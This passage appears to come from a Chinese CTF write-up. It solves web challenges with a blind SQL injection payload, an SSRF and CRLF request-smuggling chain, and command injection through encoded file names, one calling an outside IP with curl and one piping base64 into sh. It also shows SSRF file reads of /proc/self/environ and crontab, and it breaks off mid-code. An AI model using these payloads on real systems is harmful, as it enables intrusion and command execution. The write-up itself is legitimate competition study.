+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>'||<span class="keyword">case</span><span class="string">'1'</span><span class="keyword">when</span>`username`COLLATE<span class="symbol">'utf8mb4_0900_as_cs</span><span class="symbol">'like</span><span class="symbol">'a</span>%<span class="symbol">'then</span><span class="string">'1'</span><span class="keyword">else</span><span class="string">'1'</span>^<span class="number">18446744073709551614</span>%<span class="number">252</span>b2^<span class="string">'1'</span><span class="keyword">end</span>%<span class="number">253</span>d'<span class="number">0</span>&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>最后注意爆破的字符集里面的 _ % 等在like语句里面有明确意义的，爆破的时候记得转义一下</p>
+</blockquote>
+<p>最后跑出来的结果：</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号以及密码</span><br><span class="line">awk785969awlfjnlkjlii!@$<span class="comment">%!!</span></span><br><span class="line">PAssw40d_Y0u3_Never_Konwn!@!!</span><br></pre></td></tr></table></figure>
+<p>后面还有php代码解密以及反序列化生成的一些任务，因为比赛结束了，所以没解出这题，很遗憾</p>
+<h3 id="online-crt"><a href="#online-crt" class="headerlink" title="online_crt"></a>online_crt</h3><p>ssrf+crlf</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eci-2zebelhabwvwjvw18eqt.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730; ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914; __jsluid_h=d5688935e29b59feeac61f34a0ba8a3c</span><br><span class="line"><span class="attribute">x-forwarded-for</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-originating-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 91</span><br><span class="line"></span><br><span class="line">uri=/admin/rename?oldname=1%26%26newname=1%20HTTP/1.1%0d%0aHost:%20admin%0d%0a%0d%0aGET%20/</span><br></pre></td></tr></table></figure>
+
+<p>要绕</p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c.Request.URL.RawPath != <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">%252f 绕过</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: www.crmeb1.com:8888</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line"><span class="attribute">x-forwarded-for</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-originating-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 92</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">uri=/admin%252frename?oldname=1%26%26newname=1%20HTTP/1.1%0d%0aHost:admin%0d%0a%0d%0aGET%20/</span><br></pre></td></tr></table></figure>
+
+<p>可以</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`touch <span class="number">123</span>.txt`.crt</span><br></pre></td></tr></table></figure>
+<p>这样来执行命令</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eci-2zeh4pj6hmpfx2drs3cs.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730; ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914; __jsluid_h=d5688935e29b59feeac61f34a0ba8a3c</span><br><span class="line"><span class="attribute">x-forwarded-for</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-originating-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 391</span><br><span class="line"></span><br><span class="line">uri=/admin%252frename?oldname=ed7426a6-a07f-42cb-b8c6-d2610a0a3522.crt%26%26newname=%25%36%30%25%36%33%25%37%35%25%37%32%25%36%63%25%32%30%25%33%31%25%33%31%25%33%38%25%32%65%25%33%32%25%33%35%25%32%65%25%33%31%25%33%31%25%33%31%25%32%65%25%33%31%25%33%30%25%33%61%25%33%38%25%33%30%25%33%30%25%33%30%25%36%30%25%32%65%25%36%33%25%37%32%25%37%34%20HTTP/1.1%0d%0aHost:admin%0d%0a%0d%0aGET%20/</span><br></pre></td></tr></table></figure>
+
+<p>文件改成功后会有回显<br>然后 触发命令执行 payload要两次urlencode</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/createlink</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2zeh4pj6hmpfx2drs3cs.cloudeci1.ichunqiu.com:8888</span></span><br><span class="line"><span class="attr">Pragma:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=4155e350957161321937ef8e724d9f067ba0d0dc;</span> <span class="string">__jsluid_h=ac54c0c5c9d982815837432778a9eaa5</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure>
+
+<p>创建一个crt，将文件名改为echo Y2F0IC9mbGFnCg==|base64 -d|sh -i&gt;&gt;t1.txt</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/proxy</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eci-2zeh4pj6hmpfx2drs3cs.cloudeci1.ichunqiu.com:8888</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730; ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914; __jsluid_h=d5688935e29b59feeac61f34a0ba8a3c</span><br><span class="line"><span class="attribute">x-forwarded-for</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-originating-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-ip</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">x-remote-addr</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 589</span><br><span class="line"></span><br><span class="line">uri=/admin%252frename?oldname=ebacdf06-9a1e-4ac4-9f27-557670ca91de.crt%26%26newname=%25%36%30%25%36%35%25%36%33%25%36%38%25%36%66%25%32%30%25%35%39%25%33%32%25%34%36%25%33%30%25%34%39%25%34%33%25%33%39%25%36%64%25%36%32%25%34%37%25%34%36%25%36%65%25%34%33%25%36%37%25%33%64%25%33%64%25%37%63%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%30%25%32%64%25%36%34%25%37%63%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%33%65%25%33%65%25%37%34%25%33%31%25%32%65%25%37%34%25%37%38%25%37%34%25%36%30%25%32%65%25%36%33%25%37%32%25%37%34%20HTTP/1.1%0d%0aHost:admin%0d%0a%0d%0aGET%20/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/createlink</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2zeh4pj6hmpfx2drs3cs.cloudeci1.ichunqiu.com:8888</span></span><br><span class="line"><span class="attr">Pragma:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">Cache-Control:</span> <span class="literal">no</span><span class="string">-cache</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=4155e350957161321937ef8e724d9f067ba0d0dc;</span> <span class="string">__jsluid_h=ac54c0c5c9d982815837432778a9eaa5</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问文件就有了。</p>
+<p><img src="/2022/05/30/Web-22/bf8b148f-1524-4601-9f95-653bd7e877a8.png" alt></p>
+<h3 id="cmdbrowser"><a href="#cmdbrowser" class="headerlink" title="cmdbrowser"></a>cmdbrowser</h3><p>ssrf</p>
+<p>思考：</p>
+<ul>
+<li>可以直接ssrf 6397 redis端口，可以使用http dict gopher等协议直接探测到，但是有一个实时的随机的简单计算题认证才能继续使用info等redis命令</li>
+<li>但是通过逆向可以看到curl_easy_setopt等标准库里的curl函数不支持类似tty的强大交互能力</li>
+<li>考虑能通过那个实时验证之后是否能够gopher直接写入crontab计划任务后/readflag拿到flag</li>
+</ul>
+<p>ida</p>
+<blockquote>
+<p>均为标准库函数<br>考虑curl_easy_setopt的CVE？</p>
+</blockquote>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main(<span class="built_in">int</span> argc, const <span class="built_in">char</span> **argv, const <span class="built_in">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-98h]</span></span><br><span class="line">  <span class="built_in">char</span> v5<span class="literal">[<span class="number">136</span>]</span>; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  unsigned __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="constructor">__readfsqword(0x28u)</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"please input a URL\n"</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="constructor">__isoc99_scanf(<span class="string">"%100s"</span>)</span>;</span><br><span class="line">  v4 = curl<span class="constructor">_easy_init(<span class="string">"%100s"</span>, <span class="params">v5</span>)</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    curl<span class="constructor">_easy_setopt(<span class="params">v4</span>, '\'\<span class="params">x12</span>', (<span class="params">__int64</span>)</span>v5);</span><br><span class="line">    curl<span class="constructor">_easy_perform(<span class="params">v4</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>/proc/self</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="built_in">home</span>/ctf/cmdbrowser</span><br></pre></td></tr></table></figure>
+<p>/proc/self/environ</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">REMOTE_HOST</span>=<span class="number">10.0</span>.<span class="number">5.136</span></span><br><span class="line"><span class="attr">HOSTNAME</span>=engine-<span class="number">1</span>SHLVL=<span class="number">1</span></span><br><span class="line"><span class="attr">HOME</span>=/root</span><br><span class="line"><span class="attr">_</span>=/etc/init.d/xinetd</span><br><span class="line"><span class="attr">TERM</span>=xterm</span><br><span class="line"><span class="attr">PATH</span>=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"><span class="attr">PWD</span>=/</span><br><span class="line"><span class="attr">KATA_CONTAINER</span>=<span class="literal">true</span></span><br><span class="line"><span class="attr">SOCAT_PID</span>=<span class="number">129</span></span><br><span class="line"><span class="attr">SOCAT_PPID</span>=<span class="number">129</span></span><br><span class="line"><span class="attr">SOCAT_VERSION</span>=<span class="number">1.7</span>.<span class="number">3.2</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">file</span>:///etc/apache2/sites-available/000-default.conf</span><br><span class="line"><span class="section">&lt;VirtualHost *:80&gt;</span></span><br><span class="line">	<span class="comment"># The ServerName directive sets the request scheme, hostname and port that</span></span><br><span class="line">	<span class="comment"># the server uses to identify itself. This is used when creating</span></span><br><span class="line">	<span class="comment"># redirection URLs. In the context of virtual hosts, the ServerName</span></span><br><span class="line">	<span class="comment"># specifies what hostname must appear in the request's Host: header to</span></span><br><span class="line">	<span class="comment"># match this virtual host. For the default virtual host (this file) this</span></span><br><span class="line">	<span class="comment"># value is not decisive as it is used as a last resort host regardless.</span></span><br><span class="line">	<span class="comment"># However, you must set it for any further virtual host explicitly.</span></span><br><span class="line">	<span class="comment">#ServerName www.example.com</span></span><br><span class="line"></span><br><span class="line">	<span class="attribute">ServerAdmin</span> webmaster@localhost</span><br><span class="line">	<span class="attribute"><span class="nomarkup">DocumentRoot</span></span> /var/www/html</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span></span><br><span class="line">	<span class="comment"># error, crit, alert, emerg.</span></span><br><span class="line">	<span class="comment"># It is also possible to configure the loglevel for particular</span></span><br><span class="line">	<span class="comment"># modules, e.g.</span></span><br><span class="line">	<span class="comment">#LogLevel info ssl:warn</span></span><br><span class="line"></span><br><span class="line">	<span class="attribute">ErrorLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">	<span class="attribute">CustomLog</span> <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line">	<span class="comment"># For most configuration files from conf-available/, which are</span></span><br><span class="line">	<span class="comment"># enabled or disabled at a global level, it is possible to</span></span><br><span class="line">	<span class="comment"># include a line for only one particular virtual host. For example the</span></span><br><span class="line">	<span class="comment"># following line enables the CGI configuration for this host only</span></span><br><span class="line">	<span class="comment"># after it has been globally disabled with "a2disconf".</span></span><br><span class="line">	<span class="comment">#Include conf-available/serve-cgi-bin.conf</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="string">///etc/crontab</span></span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=<span class="string">/bin/sh</span></span><br><span class="line">PATH=<span class="string">/usr/local/sbin</span>:<span class="string">/usr/local/bin</span>:<span class="string">/sbin</span>:<span class="string">/bin</span>:<span class="string">/usr/sbin</span>:<span class="string">/usr/bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m h dom mon dow user	command</span></span><br><span class="line">17 *	* * *	root    <span class="keyword">cd</span> / &amp;&amp; run-parts <span class="params">--report</span> <span class="string">/etc/cron.hourly</span></span><br><span class="line">25 6	* * *	root	test -x <span class="string">/usr/sbin/anacron</span> || <span class="params">( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span></span><br><span class="line">47 6	* * 7	root	test -x <span class="string">/usr/sbin/anacron</span> || <span class="params">( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span></span><br><span class="line">52 6	1 * *	root	test -x <span class="string">/usr/sbin/anacron</span> || <span class="params">( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ez-usb"><a href="#ez-usb" class="headerlink" title="ez_usb"></a>ez_usb</h3><ol>
+<li>提取2.8.1的流量解密<br>(usb.dst == “2.8.1”  ) || (usb.src == “2.8.1”)<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tshark</span> <span class="selector-tag">-r</span> 2<span class="selector-class">.8</span><span class="selector-class">.1</span><span class="selector-class">.pcapng</span> <span class="selector-tag">-T</span> <span class="selector-tag">fields</span> <span class="selector-tag">-e</span> <span class="selector-tag">usb</span><span class="selector-class">.capdata</span> &gt; <span class="selector-tag">usbdata2</span><span class="selector-class">.8</span><span class="selector-class">.1</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 